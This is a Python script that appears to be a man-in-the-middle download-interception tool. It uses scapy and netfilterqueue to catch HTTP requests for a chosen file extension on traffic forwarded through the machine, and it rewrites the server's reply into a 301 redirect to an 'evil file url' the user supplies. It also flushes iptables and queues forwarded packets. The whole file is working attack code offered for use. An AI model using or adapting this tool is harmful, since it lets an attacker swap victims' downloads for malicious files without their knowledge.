import scapy.all as scapy
import netfilterqueue
import subprocess

ack_list = []

file = ""
url = ""

def set_url(packet, url):
        # load_string = f"HTTP/1.1 301 Moved Permanently\nLocation: {url}\n\n"
        packet[scapy.Raw].load = f"HTTP/1.1 301 Moved Permanently\nLocation: {url}\n\n"
        print("Load after modification: ", packet[scapy.Raw].load)
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
        return packet


def process_packet(packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
            if scapy_packet[scapy.TCP].dport == 80:
                if file in str(scapy_packet[scapy.Raw].load): # Replace file extension to one of your choice
                    print("Exe file found -->> \n")
                    ack_list.append(scapy_packet[scapy.TCP].ack)

            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] Replacing file =>>")
                    modified_packet = set_url(scapy_packet, str(url))
                    packet.set_payload(bytes(modified_packet))

        packet.accept()


def run():
    global file
    global url

    file = input("Enter file extension you want to target: ")
    url = input("Enter the evil file url: ")

    subprocess.run("sudo iptables --flush", check=True, shell=True)
    # subprocess.run("sudo echo 1 > /proc/sys/net/ipv4/ip_forward", check=True, shell=True)
    subprocess.run("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0", check=True, shell=True)

    # subprocess.run("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0", check=True, shell=True)
    # subprocess.run("sudo iptables -I INPUT -j NFQUEUE --queue-num 0", check=True, shell=True)

    queue = netfilterqueue.NetfilterQueue()
    # queue.bind(0, replace_download)
    queue.bind(0, process_packet)
    queue.run()


if __name__ == "__main__":
    run()